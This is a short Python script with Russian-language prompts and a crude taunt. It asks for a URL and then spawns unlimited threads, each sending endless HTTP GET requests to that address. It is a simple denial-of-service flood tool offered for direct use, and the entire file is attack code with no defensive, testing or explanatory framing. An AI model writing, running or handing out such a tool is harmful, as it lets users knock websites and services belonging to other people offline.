import threading
import requests
import time

link = input('Введите ссылку: ')
time.sleep(1)
print("Уже ебу брат")
print("Чтобы завершить нажмите Ctrl + c")
def dos():
 while True:
  requests.get(link)
while True:
 threading.Thread(target=dos).start()
